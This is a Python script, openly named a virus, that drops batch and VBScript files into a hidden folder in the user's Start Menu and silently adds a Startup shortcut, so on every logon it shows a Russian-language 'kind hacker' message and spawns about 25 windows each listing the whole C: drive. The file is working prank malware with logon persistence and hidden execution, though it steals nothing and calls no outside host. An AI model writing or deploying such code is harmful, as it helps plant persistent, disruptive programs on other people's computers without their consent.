#UTF-8
import subprocess
import os

def virus():
    oldPath = os.path.dirname(os.path.abspath(__file__))
    path = os.path.join(os.path.expandvars("%userprofile%"),"AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs")
    os.chdir(path)
    if not os.path.isdir("Startupp"):
        os.mkdir("Startupp")
    with open(path+"\\Startupp\\dir_s.bat", "w+") as w:
        w.write('color a\nC:\ncd ../../../../../../../../../../../../../../../../../../../../..\ndir /s')

    with open(path+"\\Startupp\\dir_spam.bat", "w+") as w:
        # you need a " " at the beginning otherwise it doesn't work :/
        w.write('@echo off\n\nset MAX_TRIES=25\nfor /L %%a in (1, 1, %MAX_TRIES%) do (\nstart "" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startupp\\dir_s.bat"\n)')

    with open(path+"\\Startupp\\dir_spam.vbs", "w+") as w:
        w.write('Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run chr(34) & "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startupp\\dir_spam.bat" & Chr(34), 0\nSet WshShell = Nothing')

    with open(path+"\\Startupp\\Dobriy_virus.bat", "w+", encoding="utf-8") as w:
        # you need a " " at the beginning otherwise it doesn't work :/
        w.write('@chcp 65001 >nul\n@echo off\n\necho ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥\necho Это мог быть вирус, но хакер добрый ☻\necho Поэтому при каждом запуске ПК будет появляться лишь эта надпись (и куча зелёного текста) ☻\necho Доброго дня!\necho ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥\n\nstart "" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startupp\\dir_spam.vbs"\n\npause >nul')

    with open(path+"\\Startupp\\create_lnk.bat", "w+", encoding="utf-8") as w:
        # you need a " " at the beginning otherwise it doesn't work :/
        w.write(' @echo off\n\necho Set objShell = CreateObject("WScript.Shell") > %TEMP%\\CreateShortcut.vbs\necho Set objLink = objShell.CreateShortcut("C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Dobriy file.lnk") >> %TEMP%\\CreateShortcut.vbs\necho objLink.Description = "Eto daje ne virus..." >> %TEMP%\\CreateShortcut.vbs\necho objLink.TargetPath = "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startupp\\Dobriy_virus.bat" >> %TEMP%\\CreateShortcut.vbs\necho objLink.Save >> %TEMP%\\CreateShortcut.vbs\ncscript %TEMP%\\CreateShortcut.vbs\ndel %TEMP%\\CreateShortcut.vbs')
    
    subprocess.Popen(path+"\\Startupp\\create_lnk.bat", creationflags=0x08000000)
    # subprocess.Popen("C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startupp\\create_lnk.bat")
    
    os.chdir(oldPath)

if __name__ == "__main__":
    virus()